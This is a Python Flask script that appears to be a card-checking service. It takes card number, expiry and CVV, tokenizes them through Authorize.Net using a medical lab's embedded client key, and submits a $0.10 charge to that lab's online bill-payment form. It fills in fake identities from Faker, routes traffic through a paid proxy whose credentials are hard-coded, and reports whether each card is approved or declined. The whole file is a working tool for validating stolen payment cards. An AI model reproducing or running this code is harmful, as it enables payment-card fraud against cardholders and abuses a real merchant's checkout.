from flask import Flask, request, jsonify
import requests
import uuid
import json
import time
from faker import Faker
import random

app = Flask(__name__)
faker = Faker()

# === Proxy Setup ===
proxy_url = "http://PP_9BX6SW23L0:ylbz8043_country-us_session-gKNkgfmHL0Ov@ps-pro.porterproxies.com:31112"
proxies = {
    "http": proxy_url,
    "https": proxy_url,
}

def random_name():
    return faker.name()

def random_gmail():
    user = faker.user_name() + str(random.randint(1000, 99999))
    return f"{user}@gmail.com"

def get_token(card, month, year, cvv):
    url = 'https://api2.authorize.net/xml/v1/request.api'
    headers = {
        'Content-Type': 'application/json; charset=UTF-8',
        'Origin': 'https://avanticmedicallab.com',
        'Referer': 'https://avanticmedicallab.com/',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    }
    payload = {
        "securePaymentContainerRequest": {
            "merchantAuthentication": {
                "name": "3c5Q9QdJW",
                "clientKey": "2n7ph2Zb4HBkJkb8byLFm7stgbfd8k83mSPWLW23uF4g97rX5pRJNgbyAe2vAvQu"
            },
            "data": {
                "type": "TOKEN",
                "id": str(uuid.uuid4()),
                "token": {
                    "cardNumber": card,
                    "expirationDate": f"{month}{year[-2:]}",
                    "cardCode": cvv
                }
            }
        }
    }
    r = requests.post(url, json=payload, headers=headers, proxies=proxies, timeout=30)
    data = json.loads(r.content.decode('utf-8-sig'))
    if data.get("messages", {}).get("resultCode") == "Ok":
        return data["opaqueData"]["dataValue"]
    else:
        raise Exception(f"Token gen failed: {data}")

def send_to_checkout(opaque_value, month, year, name, email, phone, address, city, state, postal):
    url = "https://avanticmedicallab.com/wp-admin/admin-ajax.php"
    boundary = "----WebKitFormBoundarycIcTvR9jbjEQpqRD"

    payload = (
        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[fields][1][first]\"\r\n\r\n{name.split()[0]}\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[fields][1][last]\"\r\n\r\n{name.split()[-1]}\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[fields][17]\"\r\n\r\n0.10\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[fields][2]\"\r\n\r\n{email}\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[fields][3]\"\r\n\r\n{phone}\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[fields][14]\"\r\n\r\nTest Data\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[fields][4][address1]\"\r\n\r\n{address}\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[fields][4][city]\"\r\n\r\n{city}\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[fields][4][state]\"\r\n\r\n{state}\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[fields][4][postal]\"\r\n\r\n{postal}\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[fields][6]\"\r\n\r\n$ 0.10\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[fields][11][]\"\r\n\r\nBy clicking on Pay Now button you have read and agreed to the policies set forth in both the Privacy Policy and the Terms and Conditions pages.\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[id]\"\r\n\r\n4449\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[author]\"\r\n\r\n1\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[post_id]\"\r\n\r\n3388\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[authorize_net][opaque_data][descriptor]\"\r\n\r\nCOMMON.ACCEPT.INAPP.PAYMENT\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[authorize_net][opaque_data][value]\"\r\n\r\n{opaque_value}\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[authorize_net][card_data][expire]\"\r\n\r\n{month}/{year}\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"wpforms[token]\"\r\n\r\n878a34345981edcaa5a5541983911264\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nwpforms_submit\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"page_url\"\r\n\r\nhttps://avanticmedicallab.com/pay-bill-online/\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"page_title\"\r\n\r\nPay Bill Online\r\n"
        f"{boundary}\r\nContent-Disposition: form-data; name=\"page_id\"\r\n\r\n3388\r\n"
        f"{boundary}--\r\n"
    )

    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "content-type": f"multipart/form-data; boundary={boundary[2:]}",
        "origin": "https://avanticmedicallab.com",
        "referer": "https://avanticmedicallab.com/pay-bill-online/",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
        "cookie": "_wpfuuid=457527fe-c388-4f24-951a-a93db204f94d"
    }

    r = requests.post(url, data=payload, headers=headers, proxies=proxies, timeout=30)
    return r.text

@app.route('/process', methods=['GET', 'POST'])
def process():
    start_time = time.time()
    cc = request.values.get("cc")

    if not cc:
        return jsonify({"error": "Missing cc parameter"}), 400

    try:
        card, mm, yy, cvv = cc.strip().split("|")
    except Exception as e:
        return jsonify({"error": "Invalid CC format", "detail": str(e)}), 400

    name = random_name()
    email = random_gmail()
    phone = f"({faker.random_int(200, 999)}) {faker.random_int(200, 999)}-{faker.random_int(1000, 9999)}"
    address = faker.street_address()
    city = "New York"
    state = "NY"
    postal = "10080"
    amount = 0.10

    try:
        token = get_token(card, mm, yy, cvv)
    except Exception as e:
        return jsonify({"success": False, "message": "Token generation failed", "detail": str(e)}), 500

    message = send_to_checkout(token, mm, yy, name, email, phone, address, city, state, postal)
    time_taken = round(time.time() - start_time, 3)

    # For debugging, print full message to your logs
    print("----RAW MESSAGE----")
    print(message)
    print("-------------------")

    # --- Detect success or decline (decline first!) ---
    if ("Payment was declined by Authorize.Net" in message or
        "This transaction has been declined" in message):
        success = False
        short_msg = "This transaction has been declined."
    elif "Your Payment is Successfully Done" in message:
        success = True
        short_msg = "Payment is Successfully Done."
    else:
        success = False
        short_msg = "Unknown response, treat as declined."

    return jsonify({
        "success": success,
        "message": short_msg,
        "amount": amount,
        "time_taken": time_taken,
        "raw_message": message
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
